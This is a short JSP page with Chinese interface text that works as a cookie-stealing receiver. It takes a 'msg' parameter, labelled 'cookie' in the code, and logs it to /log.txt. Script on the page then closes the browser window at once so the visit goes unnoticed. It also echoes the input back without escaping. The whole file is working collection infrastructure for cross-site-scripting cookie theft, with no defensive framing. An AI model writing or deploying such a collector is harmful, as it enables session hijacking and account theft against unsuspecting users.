<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
 
<%@ page import="java.text.SimpleDateFormat"%>
<%@ page import="java.io.*"%>
<%@ page import="java.net.*"%>
 
<%
//new日期对象
Date date = new Date();
SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:sss");
String logfile = "/log.txt";
String time_stamp = dateFormat.format(date);
String cookie = URLDecoder.decode(request.getParameter("msg"), "UTF-8"); 
 
if(null != cookie){
        out.println(dateFormat.format(date) + " 正在写入 " + logfile + ":[" + cookie +"]"); 
        System.out.println(dateFormat.format(date) + " 正在写入 " + logfile + ":[" + cookie +"]"); 
 
        FileWriter writer = null;  
        try {      
            writer = new FileWriter(logfile, true);     
            writer.write(time_stamp + ":\r\n" + cookie + "\r\n\r\n");       
        } catch (IOException e) {     
            e.printStackTrace();     
        } finally {     
            try {     
                if(writer != null){  
                    writer.close();     
                }  
            } catch (IOException e) {     
                e.printStackTrace();     
            }     
        }
 
}else{
        out.println(dateFormat.format(date) + " give a msg"); 
}
%>
<script language="javascript">
function custom_close(){
if 
(confirm("close？")){
window.opener=null;
window.open('','_self');
window.close();
}
else{}
}
 
window.opener=null;
window.open('','_self');
window.close();
</script>  
 <input id="btnClose" type="button" value="关闭本页" onClick="custom_close()" />
